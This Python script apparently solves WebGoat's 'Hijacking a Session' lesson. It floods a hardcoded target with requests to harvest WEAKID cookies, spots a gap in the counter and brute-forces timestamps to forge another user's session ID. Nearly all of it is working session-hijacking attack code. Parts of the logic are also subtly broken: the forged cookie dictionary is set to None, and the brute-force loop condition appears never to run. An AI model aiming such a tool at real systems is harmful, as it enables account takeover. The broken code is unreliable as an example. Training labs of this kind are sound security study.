import requests

'''
script to complete webgoat's lesson 'Hijacking a Session'.
Requires a valid JSessionId to work.

It is known that the WEAKID-Cookie consists of two parts: COUNTER & TIMESTAMP.
The goal is to obtain a WEAKID-Cookie which does not belong to the user.
In order to do so the server is flooded by post requests to get new WEAKID-Cookies.
These Cookies are analyzed and a eventually a gap (in the counter part) will be spotted.
We then use the last WEAKID-Cookie before the gap and the first one after the gap to know the range of the
appended timestamp. After this we bruteforce the timestamp and flood the server with possible WEAKID-Cookies again.
'''

target_host = "http://jupyterhub.dynvpn.de:8080/WebGoat/attack?Screen=950261113&menu=1800"
cookies = {'JSESSIONID': '18EC646499554069EAEC00B0E74DF018'}
weak_id_length = 19
weak_id_counter_length = 5
weak_id_position_hint = "name='WEAKID' type='HIDDEN' value='"


def get_weak_id(response):
    weak_id_pos_begin = response.find(weak_id_position_hint) + len(weak_id_position_hint)
    weak_id_temp = response[weak_id_pos_begin:]
    weak_id = weak_id_temp[:weak_id_length]
    return weak_id


def get_counter(weak_id):
    counter = weak_id[:weak_id_counter_length]
    return int(counter)


def get_timestamp(weak_id):
    return int(weak_id[weak_id_counter_length:])


def get_surrounding_weak_ids():
    last_weak_id = ''
    last_counter = 99999
    for i in range(1, 50):
        post = requests.post(target_host, cookies=cookies)
        response = post.text
        weak_id = get_weak_id(response)
        counter = get_counter(weak_id)
        if (counter > last_counter + 1):
            print("MISSING STEP(s) between {} and {}".format(last_weak_id, weak_id))
            return last_weak_id, weak_id
        last_weak_id, last_counter = weak_id, counter


def bruteforce_gap_weak_id(counter, start_timestamp, end_timestamp):
    timestamp = start_timestamp
    while timestamp > end_timestamp:
        timestamp -= 1
        weak_id_attempt = str(counter) + str(timestamp)
        print(weak_id_attempt)
        hacked_cookies = {'WEAKID': weak_id_attempt}.update(cookies)
        post = requests.get(target_host, cookies=hacked_cookies)


weak_id_before_gap, weak_id_after_gap = get_surrounding_weak_ids()
start_timestamp = get_timestamp(weak_id_before_gap)
end_timestamp = get_timestamp(weak_id_after_gap)
gap_counter = get_counter(weak_id_after_gap) - 1
bruteforce_gap_weak_id(gap_counter, start_timestamp, end_timestamp)
